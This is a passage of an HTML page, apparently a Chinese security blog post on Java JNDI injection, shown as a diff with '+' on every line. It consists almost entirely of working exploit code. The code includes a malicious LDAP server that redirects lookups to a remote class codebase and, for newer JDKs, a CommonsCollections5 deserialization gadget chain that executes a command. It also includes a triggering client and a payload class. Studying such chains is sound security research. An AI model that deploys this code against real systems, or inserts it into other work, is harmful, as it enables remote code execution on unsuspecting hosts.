+</span></span><span style="display:flex;"><span>                    InetAddress.<span style="color:#a6e22e">getByName</span>(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>), <span style="color:#75715e">//$NON-NLS-1$</span>
+</span></span><span style="display:flex;"><span>                    port,
+</span></span><span style="display:flex;"><span>                    ServerSocketFactory.<span style="color:#a6e22e">getDefault</span>(),
+</span></span><span style="display:flex;"><span>                    SocketFactory.<span style="color:#a6e22e">getDefault</span>(),
+</span></span><span style="display:flex;"><span>                    (SSLSocketFactory) SSLSocketFactory.<span style="color:#a6e22e">getDefault</span>()));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            config.<span style="color:#a6e22e">addInMemoryOperationInterceptor</span>(<span style="color:#66d9ef">new</span> OperationInterceptor(<span style="color:#66d9ef">new</span> URL(args<span style="color:#f92672">[</span> 0 <span style="color:#f92672">]</span>)));
+</span></span><span style="display:flex;"><span>            InMemoryDirectoryServer ds <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InMemoryDirectoryServer(config);
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Listening on 0.0.0.0:&#34;</span> <span style="color:#f92672">+</span> port); <span style="color:#75715e">//$NON-NLS-1$</span>
+</span></span><span style="display:flex;"><span>            ds.<span style="color:#a6e22e">startListening</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> ( Exception e ) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OperationInterceptor</span> <span style="color:#66d9ef">extends</span> InMemoryOperationInterceptor {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> URL codebase;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">OperationInterceptor</span> ( URL cb ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span> <span style="color:#f92672">=</span> cb;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">processSearchResult</span> ( InMemoryInterceptedSearchResult result ) {
+</span></span><span style="display:flex;"><span>            String base <span style="color:#f92672">=</span> result.<span style="color:#a6e22e">getRequest</span>().<span style="color:#a6e22e">getBaseDN</span>();
+</span></span><span style="display:flex;"><span>            Entry e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Entry(base);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                sendResult(result, base, e);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">catch</span> ( Exception e1 ) {
+</span></span><span style="display:flex;"><span>                e1.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendResult</span> ( InMemoryInterceptedSearchResult result, String base, Entry e ) <span style="color:#66d9ef">throws</span> LDAPException, MalformedURLException {
+</span></span><span style="display:flex;"><span>            URL turl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">getRef</span>().<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>).<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;.class&#34;</span>));
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Send LDAP reference result for &#34;</span> <span style="color:#f92672">+</span> base <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; redirecting to &#34;</span> <span style="color:#f92672">+</span> turl);
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaClassName&#34;</span>, <span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>            String cbstring <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> refPos <span style="color:#f92672">=</span> cbstring.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;#&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( refPos <span style="color:#f92672">&gt;</span> 0 ) {
+</span></span><span style="display:flex;"><span>                cbstring <span style="color:#f92672">=</span> cbstring.<span style="color:#a6e22e">substring</span>(0, refPos);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaCodeBase&#34;</span>, cbstring);
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;objectClass&#34;</span>, <span style="color:#e6db74">&#34;javaNamingReference&#34;</span>); <span style="color:#75715e">//$NON-NLS-1$</span>
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaFactory&#34;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">getRef</span>());
+</span></span><span style="display:flex;"><span>            result.<span style="color:#a6e22e">sendSearchEntry</span>(e);
+</span></span><span style="display:flex;"><span>            result.<span style="color:#a6e22e">setResult</span>(<span style="color:#66d9ef">new</span> LDAPResult(0, ResultCode.<span style="color:#a6e22e">SUCCESS</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>JNDI_Test.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDI_Test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Object object<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> InitialContext().<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;ldap://127.0.0.1:7777/calc&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img alt="image-20240322212803353" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240322212803353.png"></p>
+<h4 id="jdk--8u191-1">Jdk &gt;= 8u191</h4>
+<p><strong>通过反序列</strong></p>
+<p>通过反序列，那么前提是客户端得有可用的<code>Gadgets</code></p>
+<p>LDAPServer.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.Entry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.LDAPResult;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.ResultCode;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.management.BadAttributeValueExpException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.ServerSocketFactory;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.SocketFactory;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.ssl.SSLSocketFactory;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.InetAddress;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LDAPServer</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LDAP_BASE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dc=example,dc=com&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span> ( String<span style="color:#f92672">[]</span> tmp_args ) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> args<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;http://192.168.43.88/#test&#34;</span>};
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> 6666;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        InMemoryDirectoryServerConfig config <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);
+</span></span><span style="display:flex;"><span>        config.<span style="color:#a6e22e">setListenerConfigs</span>(<span style="color:#66d9ef">new</span> InMemoryListenerConfig(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;listen&#34;</span>, <span style="color:#75715e">//$NON-NLS-1$</span>
+</span></span><span style="display:flex;"><span>                InetAddress.<span style="color:#a6e22e">getByName</span>(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>), <span style="color:#75715e">//$NON-NLS-1$</span>
+</span></span><span style="display:flex;"><span>                port,
+</span></span><span style="display:flex;"><span>                ServerSocketFactory.<span style="color:#a6e22e">getDefault</span>(),
+</span></span><span style="display:flex;"><span>                SocketFactory.<span style="color:#a6e22e">getDefault</span>(),
+</span></span><span style="display:flex;"><span>                (SSLSocketFactory) SSLSocketFactory.<span style="color:#a6e22e">getDefault</span>()));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        config.<span style="color:#a6e22e">addInMemoryOperationInterceptor</span>(<span style="color:#66d9ef">new</span> OperationInterceptor(<span style="color:#66d9ef">new</span> URL(args<span style="color:#f92672">[</span> 0 <span style="color:#f92672">]</span>)));
+</span></span><span style="display:flex;"><span>        InMemoryDirectoryServer ds <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InMemoryDirectoryServer(config);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Listening on 0.0.0.0:&#34;</span> <span style="color:#f92672">+</span> port); <span style="color:#75715e">//$NON-NLS-1$</span>
+</span></span><span style="display:flex;"><span>        ds.<span style="color:#a6e22e">startListening</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OperationInterceptor</span> <span style="color:#66d9ef">extends</span> InMemoryOperationInterceptor {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> URL codebase;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">OperationInterceptor</span> ( URL cb ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span> <span style="color:#f92672">=</span> cb;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">processSearchResult</span> ( InMemoryInterceptedSearchResult result ) {
+</span></span><span style="display:flex;"><span>            String base <span style="color:#f92672">=</span> result.<span style="color:#a6e22e">getRequest</span>().<span style="color:#a6e22e">getBaseDN</span>();
+</span></span><span style="display:flex;"><span>            Entry e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Entry(base);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                sendResult(result, base, e);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">catch</span> ( Exception e1 ) {
+</span></span><span style="display:flex;"><span>                e1.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendResult</span> ( InMemoryInterceptedSearchResult result, String base, Entry e ) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>            URL turl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">getRef</span>().<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>).<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;.class&#34;</span>));
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Send LDAP reference result for &#34;</span> <span style="color:#f92672">+</span> base <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; redirecting to &#34;</span> <span style="color:#f92672">+</span> turl);
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaClassName&#34;</span>, <span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>            String cbstring <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> refPos <span style="color:#f92672">=</span> cbstring.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;#&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( refPos <span style="color:#f92672">&gt;</span> 0 ) {
+</span></span><span style="display:flex;"><span>                cbstring <span style="color:#f92672">=</span> cbstring.<span style="color:#a6e22e">substring</span>(0, refPos);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaSerializedData&#34;</span>,CommonsCollections5());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            result.<span style="color:#a6e22e">sendSearchEntry</span>(e);
+</span></span><span style="display:flex;"><span>            result.<span style="color:#a6e22e">setResult</span>(<span style="color:#66d9ef">new</span> LDAPResult(0, ResultCode.<span style="color:#a6e22e">SUCCESS</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">CommonsCollections5</span>() <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{}}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>        Map map<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        Map lazyMap<span style="color:#f92672">=</span>LazyMap.<span style="color:#a6e22e">decorate</span>(map,chainedTransformer);
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap,<span style="color:#e6db74">&#34;test&#34;</span>);
+</span></span><span style="display:flex;"><span>        BadAttributeValueExpException badAttributeValueExpException<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> BadAttributeValueExpException(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        Field field<span style="color:#f92672">=</span>badAttributeValueExpException.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;val&#34;</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(badAttributeValueExpException,tiedMapEntry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectOutputStream objectOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(byteArrayOutputStream);
+</span></span><span style="display:flex;"><span>        objectOutputStream.<span style="color:#a6e22e">writeObject</span>(badAttributeValueExpException);
+</span></span><span style="display:flex;"><span>        objectOutputStream.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> byteArrayOutputStream.<span style="color:#a6e22e">toByteArray</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>JNDI_Test.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDI_Test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Object object<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> InitialContext().<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;ldap://127.0.0.1:7777/calc&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>test.class放http服务下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">test</span>() <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img alt="image-20240322214343240" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240322214343240.png"></p>
+
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='tags'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z" />
+<line x1="7" y1="7" x2="7" y2="7" />
+</svg>
+<span class='screen-reader-text'>Tags: </span><a class='tag' href='/tags/java/'>Java</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='prev-entry sep-before'>
+      <a href='/docs/java/rmi/'>
+        <span aria-hidden='true'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="20" y1="12" x2="4" y2="12" />
+<polyline points="10 18 4 12 10 6" />
+</svg>
+ Previous</span>
+        <span class='screen-reader-text'>Previous post: </span>RMI</a>
+    </div><div class='next-entry sep-before'>
+      <a href='/docs/vul/log4j2-lookup-jndi%E6%B3%A8%E5%85%A5cve-2021-44228/'>
+        <span class='screen-reader-text'>Next post: </span>Log4j2 lookup JNDI注入(CVE-2021-44228)<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/n2ryx' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:experience_0109@163.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p></p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
